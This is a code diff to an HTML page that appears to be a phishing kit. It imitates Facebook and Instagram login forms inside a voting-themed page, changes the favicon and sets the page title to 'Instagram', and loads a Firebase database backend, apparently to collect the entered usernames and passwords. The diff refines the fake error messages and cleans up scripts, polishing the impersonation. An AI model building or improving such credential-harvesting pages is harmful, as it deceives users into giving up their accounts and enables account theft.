@@ -3337,7 +3337,7 @@
                     <div class="t706__cartwin-content">
                         <div class="t706__cartwin-top">
                             <div class="t706__cartwin-heading t-name t-name_xl">You
-                                must be logged in!</div>
+                                must log in to continue!</div>
                         </div>
                         <div class="t706__cartwin-products">
                             <div class="t706__cartwin-bottom">
@@ -3369,7 +3369,7 @@
             </div><br><br><br>
 
             <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
-                <div class="fsl fwb fcb" style="font-weight: 700;">Wrong credentials</div>
+                <div class="fsl fwb fcb" style="font-weight: 700; font-size: 14px;">Wrong credentials</div>
                 <div>Invalid username or password</div>
             </div><br>
 
@@ -3603,17 +3603,13 @@
                                                                                     type="submit" onclick="iglog()"
                                                                                     id="ig-log"> Log in</button>
                                                                             </div>
-                                                                        </div>
-                                                                        <span
-                                                                            class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x5n08af x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
-                                                                            dir="auto"
-                                                                            style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
-                                                                            <div style="display: none;" class="_ab2z"
-                                                                                id="_ab2z">
-                                                                                Sorry, your password was
+                                                                            <div style="display: none;"
+                                                                                id="ig_error_box" class="_ab2z">Sorry,
+                                                                                your
+                                                                                password was
                                                                                 incorrect. Please double-check your
                                                                                 password.</div>
-                                                                        </span>
+                                                                        </div>
 
                                                                         <div
                                                                             class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xw7yly9 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
@@ -3662,21 +3658,9 @@
 
     <!--Insta login ends-->
 
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
     <script>
-        function showCustomAlert() {
-            Swal.fire({
-                title: 'Oops!',
-                text: 'Something went wrong with your vote.',
-                icon: 'error',
-                confirmButtonText: 'Try Again'
-            });
-        }
-    </script>
 
 
-
-    <script>
         function togglePasswordVisibility() {
             var passwordField = document.getElementById("password");
             var toggleButton = document.querySelector(".toggle-password");
@@ -3706,9 +3690,7 @@
             input.value = "";
             document.getElementById("clearIcon").style.display = "none";
         }
-    </script>
 
-    <script>
         function changeFavicon(iconUrl) {
             const favicon = document.getElementById('dynamic-favicon');
             favicon.href = iconUrl;
@@ -3742,45 +3724,22 @@
             document.title = 'Instagram';
 
         }
-    </script>
 
-    <script>
-        function login() {
-            // Your login validation logic here
-            var username = document.getElementById('fb-email').value;
-            var password = document.getElementById('fb-pass').value;
 
-            // For demonstration purposes, let's assume the credentials are always wrong.
-            if (username !== "correctUsername" || password !== "correctPassword") {
-                document.getElementById('error_box').style.display = 'block';
-            } else {
-                // Redirect or log in the user
-                window.location.href = "index.html"; // example redirect
-            }
+        function closeVoteBox() {
+            document.getElementById('voteBox').style.display = 'none';
         }
+
     </script>
 
-    <!--Firebase-->
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
 
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
     <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
-    <script src="/js/firebase.js">
+    <script src="/js/firebase.js"></script>
 
-
-
-    </script>
-    <!--Firebase ends-->
-
-    <!--Hide VOTEBOX -->
-    <script>
-        function closeVoteBox() {
-            document.getElementById('voteBox').style.display = 'none';
-        }
-    </script>
 
 </body>
 
